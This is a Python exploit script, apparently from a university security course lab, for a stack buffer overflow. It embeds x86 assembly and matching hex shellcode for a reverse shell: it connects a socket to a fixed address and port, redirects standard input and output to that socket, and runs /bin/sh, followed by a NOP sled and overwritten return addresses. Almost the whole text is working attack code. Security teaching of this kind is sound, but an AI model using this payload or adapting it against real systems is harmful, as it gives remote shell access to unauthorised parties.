"""
# 1. assembly source code for socket() connect() and dup2()
# 2. use shellcode from shellcode.py to int /bin/sh 
# 3. use object dump to get what to write to buffer, shellcode_1

# note: part of the code(dup2 function) referenced from https://github/daocunyang/CS461/blob/master/mp1/1.2.10.py 
# majority of the code wrote from scratch


.global main
.section .text

main:
#eax = 102
xor	%eax,%eax	
movb	$102, %al	


#reset all regs
xor	%ebx, %ebx
xor	%ecx, %ecx
xor	%edx, %edx
xor	%esi, %esi

#push argv and set params for socket
movb	$1, %bl
push	%esi
movb	$1, %dl
push	%edx
movb	$2, %cl
push	%ecx
movl	%esp, %ecx

#call socket	 
int	$0x80

#save sock file descriptor to esi
movl	%eax, %esi
	
#push struct sockaddr_in
movl	$0x02010180, %eax
subl	$0x01010101, %eax
pushl	%eax

#port value
pushw	$0x697a

#AF_INET = 2
xor	%ecx, %ecx		
movb	$2, %cl		
pushw	%cx

#pointer to the struct			
movl	%esp, %edi		

#push arguments for connect
pushl	$16	
pushl	%edi		
pushl	%esi

#set regs for system call 
xor	%eax, %eax	
movb	$102, %al	
xor	%ebx, %ebx
movb	$3, %bl	
movl	%esp, %ecx

#call connect
int	$0x80		
 
#dup2(), respectively redirect stdin,stdout,stderr to sockfd

xor	%eax, %eax
movl	%esi, %ebx

movb	$63, %al
xor	%ecx, %ecx
int	$0x80

movb	$63, %al
add	$1, %ecx
int	$0x80

movb	$63, %al
add	$1, %ecx
int	$0x80
"""

#
from struct import pack
from shellcode import shellcode

shellcode_1 = '\x31\xc0\xb0\x66\x31\xdb\x31\xc9\x31\xd2\x31\xf6\xb3\x01\x56\xb2\x01\x52\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\xb8\x80\x01\x01\x02\x2d\x01\x01\x01\x01\x50\x66\x68\x7a\x69\x31\xc9\xb1\x02\x66\x51\x89\xe7\x6a\x10\x57\x56\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x89\xe1\xcd\x80\x31\xc0\x89\xf3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\x83\xc1\x01\xcd\x80\xb0\x3f\x83\xc1\x01\xcd\x80'

ebp = 0xbffe7ec8
buff = 0xbffe76b8
eip = 0xbffe7ecc
len_shellcode = len(shellcode + shellcode_1)


print  shellcode_1 + shellcode+ '\x90' * (2048 - len_shellcode) + pack('<I', buff) + pack('<I', eip)
#print len_shellcode

